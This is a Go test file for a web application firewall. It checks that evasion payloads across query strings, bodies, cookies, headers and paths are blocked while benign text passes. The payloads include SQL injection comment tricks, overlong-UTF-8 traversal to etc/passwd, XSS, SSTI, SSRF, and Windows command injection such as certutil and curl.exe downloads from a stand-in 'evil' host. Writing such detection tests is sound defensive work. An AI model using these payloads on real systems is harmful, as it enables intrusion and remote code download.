package waf

import (
	"net/http"
	"net/url"
	"testing"
)

// TestSemanticEngine_EvasionHardening pins the detection gaps closed by the
// normalizer, triage and tokenizer hardening (comment truncation, comment
// fusion, overlong UTF-8, libinjection misses, Windows shell binaries).
func TestSemanticEngine_EvasionHardening(t *testing.T) {
	attacks := []struct {
		name    string
		payload string
	}{
		{"SQL hash comment breakout", `admin'#`},
		{"SQL hash comment with space", `admin' #`},
		{"SQL dash comment trailing space", `admin'-- `},
		{"SQL unterminated comment prefix", `/*' OR 1=1--`},
		{"SQL unterminated comment mid value", `abc/*' OR 1=1--`},
		{"SQL MySQL executable comment", `/*!50000' OR 1=1--`},
		{"SQL comment splits union and select", `1'/**/UNION/**/SELECT/**/1,2,3--`},
		{"SQL overlong UTF-8 quote", `1%C0%A7OR 1=1`},
		{"Traversal overlong UTF-8 two byte", `..%c0%af..%c0%afetc/passwd`},
		{"Traversal overlong UTF-8 three byte", `%e0%80%ae%e0%80%ae%e0%80%afetc/passwd`},
		{"XSS iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>">`},
		{"CmdI Windows powershell", `& powershell -c whoami`},
		{"CmdI Windows cmd.exe", `|cmd.exe /c whoami`},
		{"CmdI Windows certutil", `;certutil -urlcache -f http://evil/x y`},
		{"CmdI extension suffixed binary", `|curl.exe http://evil`},
		{"CmdI tokenizer non-progress shape", `;id(`},
		{"SSTI sensitive config object", `pref={{ config }}`},
		{"SSTI twig statement block", `payload={% set x = 1 %}`},
		{"SSTI ruby arithmetic canary", `#{7*7}`},
		{"PHP serialized array", `a:1:{s:1:"a";s:1:"b";}`},
		{"SSRF loopback literal", `http://127.0.0.1:8080/admin`},
		{"SSRF octal loopback", `http://0177.0.0.1/`},
		{"SQL unquoted boolean tautology", `1 or true`},
		{"XSS xmp raw-text smuggling", `<xmp><img src=x onerror=alert(1)></xmp>`},
	}

	engine := NewSemanticEngine()
	for _, tc := range attacks {
		t.Run(tc.name, func(t *testing.T) {
			verdict, err := engine.InspectRequest(queryContext(tc.payload))
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if verdict.Action != ActionBlock {
				t.Errorf("expected ActionBlock for %q, got %v (rule %q, reason %q)",
					tc.payload, verdict.Action, verdict.RuleID, verdict.Reason)
			}
		})
	}
}

// TestSemanticEngine_HardeningBenignValues ensures the new structural gates do
// not block ordinary prose, globs, dates, or shell-adjacent text.
func TestSemanticEngine_HardeningBenignValues(t *testing.T) {
	benign := []string{
		`it's fine`,
		`don't stop`,
		`O'Brien`,
		`user's name`,
		`it's #1`,
		`src/*.go`,
		`find '/*.go'`,
		`it's--fine`,
		`it's -- fine`,
		`1,2,3`,
		`2024-01-01`,
		`test@example.com`,
		`v1.2.3`,
		`either 1 or 2`,
		`C:\Users\Public`,
		`a & b`,
		`rock 'n' roll`,
		`Hello "world"`,
		`{{ username }}`,
		`{{ request_id }}`,
		`1 or 2`,
		`Chapter 1 or true stories`,
		`note=a:1`,
		`redirect=http://localhost:3000/callback`,
		`fetch=https://10.1.2.3/admin`,
	}

	engine := NewSemanticEngine()
	for _, payload := range benign {
		t.Run(payload, func(t *testing.T) {
			verdict, err := engine.InspectRequest(queryContext(payload))
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if verdict.Action != ActionAllow {
				t.Errorf("expected ActionAllow for %q, got %v (rule %q, reason %q)",
					payload, verdict.Action, verdict.RuleID, verdict.Reason)
			}
		})
	}
}

// TestSemanticEngine_EvasionAcrossSurfaces verifies the hardened paths apply to
// headers, cookies, JSON/form bodies, parameter names and the request path.
func TestSemanticEngine_EvasionAcrossSurfaces(t *testing.T) {
	cases := []struct {
		name string
		ctx  *RequestContext
	}{
		{
			name: "JSON body",
			ctx: &RequestContext{
				Method:  http.MethodPost,
				Path:    "/login",
				Headers: http.Header{"Content-Type": []string{"application/json"}},
				Body:    []byte(`{"username":"admin'#","password":"x"}`),
			},
		},
		{
			name: "form body comment fusion",
			ctx: &RequestContext{
				Method:  http.MethodPost,
				Path:    "/search",
				Headers: http.Header{"Content-Type": []string{"application/x-www-form-urlencoded"}},
				Body:    []byte(`q=1'/**/UNION/**/SELECT/**/1,2,3--`),
			},
		},
		{
			name: "cookie",
			ctx: &RequestContext{
				Method:  http.MethodGet,
				Path:    "/",
				Headers: http.Header{"Cookie": []string{"pref=dark; user=admin'-- "}},
			},
		},
		{
			name: "custom header",
			ctx: &RequestContext{
				Method:  http.MethodGet,
				Path:    "/",
				Headers: http.Header{"X-Debug": []string{`<iframe srcdoc="<script>alert(1)</script>">`}},
			},
		},
		{
			name: "parameter name",
			ctx: &RequestContext{
				Method:  http.MethodGet,
				Path:    "/",
				Query:   url.QueryEscape("admin'#") + "=1",
				Headers: http.Header{},
			},
		},
		{
			name: "request path",
			ctx: &RequestContext{
				Method:  http.MethodGet,
				Path:    "/../../etc/passwd",
				Headers: http.Header{},
			},
		},
	}

	engine := NewSemanticEngine()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			verdict, err := engine.InspectRequest(tc.ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if verdict.Action != ActionBlock {
				t.Errorf("expected ActionBlock, got %v (rule %q, reason %q)",
					verdict.Action, verdict.RuleID, verdict.Reason)
			}
		})
	}
}

func queryContext(payload string) *RequestContext {
	return &RequestContext{
		Method:  http.MethodGet,
		Host:    "example.com",
		Path:    "/",
		Query:   "q=" + url.QueryEscape(payload),
		Headers: http.Header{},
	}
}
